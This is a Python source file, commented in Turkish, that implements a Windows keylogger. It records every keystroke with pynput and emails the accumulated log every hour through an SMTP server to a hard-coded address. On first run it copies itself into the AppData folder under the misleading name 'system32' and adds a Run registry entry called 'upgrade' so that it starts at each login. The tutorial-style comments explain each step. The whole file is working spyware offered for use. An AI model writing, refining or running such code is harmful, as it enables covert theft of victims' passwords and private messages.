import pynput.keyboard as pynput
import smtplib
import threading
import os
import shutil
import sys
import subprocess

log = """
start
"""


def callback_func(key):                         #klavyede tıklanan her tuşun değerini bize döndürecek fonksiyonumuz
    global log
    try:
        log = log + key.char.encode("utf-8")    #klavyeden girilen her tuşu key olarak döndürüyor
    except:                                     #tüm keyleri log stringi içinde topluyoruz
        log = log + str(key)


def send_mail(email, password, to_email, message):      #mail servisimizin fonksiyonu
    server = smtplib.SMTP("smtp.live.com", 587)         #hotmail ve gmail 587 numaralı portu kullanmaktadır
    server.starttls()                                   #servera bağlandık, serveri başlattık, giriş yaptık, maili gönderdik
    server.login(email, password)                       # ve serveri kapattık
    server.sendmail(email, to_email, message)
    server.close()


def thread_func():
    global log                                          #threading fonksiyonu özet olarak bize iki işi aynı anda
    send_mail("@hotmail.com", "", "@gmail.com", log)    #sorunsuzca gerçekleştirmemizi sağlıyor
    log = """                                          

    """
    timer = threading.Timer(3600, thread_func) #belli bir sürede mail atarken aynı anda log kayıtlarını tutmaya devam
    timer.start()                              #etmemizi sağlıyor, 3600sn de bir (saat başı) logları mail atıyor.
    #arkada yaptığı işlem şu ; 3600 saniyede bir thread_func() fonksiyonunu tekrar çalıştıyor

#keylogger makine de çalıştırılınca log tutmaktan önce kendini sistem içine kopyalamayı ve başlangıç programı
#olarak çalışmasını ayarlıyor
file_path = os.environ["appdata"] + "\\system32"    #burda girilen path'i kontrol ediyor
if not os.path.exists(file_path):                   #burda eğer öyle bir path yoksa
    shutil.copyfile(sys.executable, file_path)      #kendini oraya kopyalıyor
    regedit = "reg add HKCU\\Software\\Microsoft\\Windows\\Currentversion\\Run /v upgrade /t REG_SZ /d " + file_path
    #Windows açılırken çalışması için gereken regedit ayarlarının cmd üzerinden yapılmasını sağlayan kod
    subprocess.call(regedit, shell=True)

listener = pynput.Listener(on_press=callback_func)      #burda klavyeyi dinleme fonksiyonunu çağırıyoruz

with listener:
    thread_func()
    listener.join()